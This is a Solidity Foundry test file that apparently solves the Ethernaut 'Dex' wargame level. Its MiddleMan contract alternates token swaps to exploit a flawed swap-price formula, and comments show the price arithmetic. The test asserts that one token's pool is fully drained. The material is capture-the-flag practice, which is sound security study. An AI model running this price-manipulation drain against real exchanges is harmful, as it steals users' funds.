// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Dex.sol";

// the algo of getSwapPrice() is defected; should use xy=k instead
// A -> B: (10 A * 100 B) / 100 A = 10 B, middleMan: (0, 20)
// B -> A: (20 B * 110 A) / 90 B = 24 A, middleMan: (24, 0)
// A -> B: (24 A * 110 B) / 86 A = 30 B
// B -> A: 30 * 110 / 80 = 41
// A -> B: 41 * 110 / 69 = 65
// B -> A: 65 * 110 / 45 = 158 > 110
// now having > Dex's balance, 45 * 110 / 45 = 110, depleting A

contract MiddleMan {
    function attack(address prey) public {
        Dex dex = Dex(prey);
        IERC20 token1 = IERC20(dex.token1());
        IERC20 token2 = IERC20(dex.token2());

        dex.approve(prey, type(uint256).max);
        while (token2.balanceOf(address(this)) < token2.balanceOf(prey)) {
            if (token1.balanceOf(address(this)) != 0) {
                dex.swap(
                    address(token1),
                    address(token2),
                    token1.balanceOf(address(this))
                );
            } else {
                dex.swap(
                    address(token2),
                    address(token1),
                    token2.balanceOf(address(this))
                );
            }
        }
    }

    function swap2To1(address prey, uint256 amount) public {
        Dex dex = Dex(prey);
        dex.swap(dex.token2(), dex.token1(), amount);
    }
}

contract DexTest is Test {
    Dex instance;
    uint256 totalSupply = 110;
    SwappableToken token1;
    SwappableToken token2;

    function setUp() public {
        instance = new Dex();
        token1 = new SwappableToken(
            address(instance),
            "Token1",
            "T1",
            totalSupply
        );
        token2 = new SwappableToken(
            address(instance),
            "Token2",
            "T2",
            totalSupply
        );
    }

    function test() public {
        instance.setTokens(address(token1), address(token2));
        token1.transfer(address(instance), 100);
        token2.transfer(address(instance), 100);

        // can simulate having an EOA and sending to a contract or not
        // address alice = makeAddr("Alice");
        // token1.transfer(alice, 10);
        // token2.transfer(alice, 10);
        // vm.startPrank(alice);

        MiddleMan middleMan = new MiddleMan();
        token1.transfer(address(middleMan), 10);
        token2.transfer(address(middleMan), 10);

        middleMan.attack(address(instance));
        middleMan.swap2To1(address(instance), 45);

        assertEq(token1.balanceOf(address(instance)), 0);
        assertEq(token1.balanceOf(address(middleMan)), totalSupply);
        assertEq(
            instance.getSwapPrice(address(token2), address(token1), 45),
            0
        );
        vm.expectRevert(bytes("panic: division or modulo by zero (0x12)"));
        instance.getSwapPrice(address(token1), address(token2), 45);
    }
}
